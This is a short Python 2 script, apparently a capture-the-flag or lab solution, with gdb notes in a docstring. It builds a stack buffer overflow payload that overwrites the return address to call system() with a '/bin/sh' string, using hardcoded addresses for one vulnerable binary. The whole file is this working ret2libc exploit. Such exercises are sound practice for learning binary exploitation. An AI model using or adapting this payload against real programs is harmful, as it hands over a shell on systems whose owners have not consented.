from struct import pack
ebp = 0xbffed1b8
buf = 0xbffed1a6
system_addr = 0x804a030
binsh = 0x80c61e5
"""
b greetings
r
x 0x80c6048
info reg
x/s address of echo Hello world
"""
# print 'a'
print "\x41" * (ebp - buf + 4) + pack("<I", system_addr) + "\x41" * 4 + pack("<I", binsh)
# print "A" * 22 + pack("<I", system_addr) + "A" * 4 + pack("<I", binsh)
